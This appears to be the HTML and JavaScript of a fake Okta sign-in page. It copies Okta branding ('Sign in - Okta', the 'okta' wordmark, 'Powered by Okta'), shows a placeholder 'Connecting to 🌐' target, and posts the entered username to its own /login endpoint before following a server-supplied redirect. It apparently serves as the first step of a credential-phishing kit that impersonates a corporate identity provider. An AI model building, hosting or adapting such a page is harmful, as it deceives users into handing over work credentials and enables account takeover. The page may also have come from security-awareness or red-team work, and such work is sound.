<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Sign in - Okta</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        body {
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .top-header {
            text-align: center;
            padding: 20px 10px;
            border-bottom: 1px solid #e6e6e6;
            background: #fafafa;
        }

        .top-header h6 {
            font-weight: 500;
            color: #666;
            margin: 0;
        }

        .top-header small {
            color: #888;
        }

        .login-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-card {
            width: 100%;
            max-width: 420px;
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.08);
        }

        .okta-logo {
            font-size: 36px;
            font-weight: 700;
            color: #1f4fa3;
            text-align: center;
            padding: 30px 0;
            border-bottom: 1px solid #eee;
            letter-spacing: 1px;
        }

        .login-body {
            padding: 30px;
        }

        .login-title {
            text-align: center;
            font-weight: 500;
            margin-bottom: 25px;
        }

        .form-control {
            height: 42px;
        }

        .btn-okta {
            background: #2563d1;
            border: none;
            height: 42px;
            font-weight: 500;
        }

        .btn-okta:hover {
            background: #1f54b8;
        }

        .footer-link {
            font-size: 14px;
            margin-top: 15px;
            display: inline-block;
        }

        .bottom-footer {
            font-size: 13px;
            color: #888;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
        }

        /* ALERT */

        .okta-alert {
            border: 1px solid #ddd;
            background: #fafafa;
            padding: 15px;
            margin-bottom: 20px;
        }

        .alert-icon {
            width: 42px;
            height: 42px;
            background: #e74c3c;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            border-radius: 4px;
        }

        @media (max-width:576px) {

            .login-card {
                border: none;
                box-shadow: none;
            }

            .login-body {
                padding: 20px;
            }

            .okta-logo {
                font-size: 30px;
            }

        }
    </style>
</head>

<body>

    <!-- HEADER -->
    <div class="top-header">

        <h6>
            Connecting to 🌐
        </h6>

        <small>
            Sign in with your account to access Okta Dashboard
        </small>

    </div>

    <!-- LOGIN -->
    <div class="login-container">

        <div class="login-card">

            <div class="okta-logo">
                okta
            </div>

            <div class="login-body">

                <div class="login-title">
                    Sign In
                </div>

                <!-- ALERT -->
                <div id="form-error" class="okta-alert d-none">

                    <div class="d-flex align-items-center">

                        <div class="alert-icon me-3">
                            !
                        </div>

                        <div>
                            We found some errors. Please review the form and make corrections.
                        </div>

                    </div>

                </div>

                <form id="login-form" action="/login" method="POST">

                    <div class="mb-3">

                        <label class="form-label">Username</label>

                        <input id="username" name="username" type="text" class="form-control">

                        <div id="username-error" class="invalid-feedback">
                            This field cannot be left blank
                        </div>

                    </div>

                    <div class="form-check mb-3">

                        <input class="form-check-input" type="checkbox" id="remember">

                        <label class="form-check-label" for="remember">
                            Keep me signed in
                        </label>

                    </div>

                    <button type="submit" class="btn btn-okta w-100 text-white">
                        Next
                    </button>

                    <div class="text-start">

                        <a href="#" class="footer-link">
                            Help
                        </a>

                    </div>

                </form>

            </div>

        </div>

    </div>

    <!-- FOOTER -->
    <div class="bottom-footer">

        <div>
            Powered by Okta
        </div>

        <div>
            Privacy Policy
        </div>

    </div>

    <script>

        const form = document.getElementById('login-form');
        const input = document.getElementById('username');
        const errorDiv = document.getElementById('username-error');
        const alertBox = document.getElementById('form-error');

        input.addEventListener("input", () => {

            input.classList.remove("is-invalid");
            alertBox.classList.add("d-none");

        });

        form.addEventListener('submit', async (e) => {

            e.preventDefault();

            input.classList.remove('is-invalid');

            const formData = new URLSearchParams();

            for (const [key, value] of new FormData(form)) {
                formData.append(key, value);
            }

            const response = await fetch(form.action, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData.toString(),
            });

            const data = await response.json();

            if (data.redirect) {
                window.location.href = data.redirect;
                return;
            }

            if (!data.success) {

                errorDiv.textContent = data.error || "Login failed.";

                input.classList.add("is-invalid");
                alertBox.classList.remove("d-none");
            }

        });

    </script>

</body>

</html>
